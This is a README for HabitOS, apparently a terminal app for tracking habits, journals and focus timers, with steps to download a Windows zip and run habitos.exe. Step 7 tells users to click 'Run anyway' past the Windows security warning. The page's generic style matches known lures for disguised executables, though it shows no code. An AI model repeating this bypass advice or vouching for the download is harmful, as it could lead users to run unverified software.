# 🚀 habitos - Manage your daily life inside terminal

[![](https://img.shields.io/badge/Download_for_Windows-blue)](https://github.com/unipolar-style14/habitos/releases)

HabitOS acts as a home for your goals, habits, and daily plans. It runs directly inside your computer terminal. This tool keeps your personal data private by saving everything on your machine instead of the internet. You do not need to rely on cloud services or web browsers to track your progress.

## 📁 What this application does

This tool organizes your life into a single interface. You can track habits, set daily goals, write journal entries, and keep notes. Because it uses a simple file format, your data stays under your control at all times. The application works offline, so you can focus on your tasks without internet distractions. You can choose to use artificial intelligence features if you want, but the core tools work perfectly without them.

## ⚙️ Minimum system requirements

To run HabitOS on your Windows computer, you need basic system specs:

*   Windows 10 or Windows 11 operating system.
*   At least 4 gigabytes of memory.
*   A stable internet connection for the initial download.
*   A screen resolution of 1280x720 or higher.
*   No additional software or coding tools are necessary.

## 📥 How to download and install

Follow these steps to set up the software on your Windows machine:

1. Visit the [official release page](https://github.com/unipolar-style14/habitos/releases) to access the installer.
2. Look for the file named `habitos-windows.zip` in the latest release section.
3. Click the filename to save it to your Downloads folder.
4. Open your Downloads folder in Windows File Explorer.
5. Right-click the `.zip` file and select "Extract All."
6. Open the extracted folder and double-click the file named `habitos.exe`.
7. Windows may show a security prompt because the app is new. Click "More Info" and then choose "Run anyway." 

The terminal window will open automatically. You are now ready to begin using the application.

## 🎯 Getting started with your tasks

When you open the application, you will see a main menu. You can navigate through the menus using the arrow keys on your keyboard. Press the Enter key to select an option.

### Tracking habits
To add a new habit, select the "Add" option from the main screen. Type the name of the habit you wish to track, such as "Read books" or "Drink water." You can set a frequency for each habit, such as daily or weekly. The application shows a checkmark next to each habit when you mark it as done.

### Writing journal entries
The journal section allows you to record your thoughts at the end of the day. Select "Journal" from the menu to see a list of past entries. Select "New Entry" to start writing. Type your notes and save them by pressing the Escape key. All entries stay on your hard drive in a dedicated folder.

### Using the focus timer
The focus mode acts as a countdown timer for your work sessions. Choose "Focus" from the main menu and set your desired time duration. The application will track your progress. When the timer hits zero, the application will notify you to take a break.

## 🛡️ Privacy and your data

Your data stays on your computer. HabitOS saves your habits and notes as a small file within the application folder. The software does not send your personal information to any servers. You can back up your data by copying the entire folder to an external drive or a cloud storage provider of your choice.

## 🛠️ Frequently asked questions

**Where does the application save my information?**
The tool saves all files in the folder where you placed the application. You can move this folder to any location on your computer.

**Can I use the app without the internet?**
Yes. HabitOS runs entirely offline. You only need the internet to download updates.

**How do I delete the software?**
To remove the application, simply delete the folder containing `habitos.exe`. No files get left behind in your Windows Registry or system folders.

**Is my data safe if I delete the folder?**
If you delete the folder, you will also remove your saved habits and journals. Make sure to back up your data if you intend to remove the software.

**Does this require coding skills?**
No. You do not need experience with command-line tools to use HabitOS. The interface guides you through every step.

## 💡 Troubleshooting tips

If you encounter issues while running the software:

*   **App fails to open:** Ensure your Windows account has permission to run programs from your chosen folder.
*   **Text looks messy:** Try resizing the terminal window. The interface adjusts to the width of the window.
*   **Keyboard keys do not work:** Click inside the terminal window once with your mouse to ensure it has focus.
*   **Updates:** Check the download link occasionally to see if a newer version exists. New versions often include bug fixes and stability improvements.
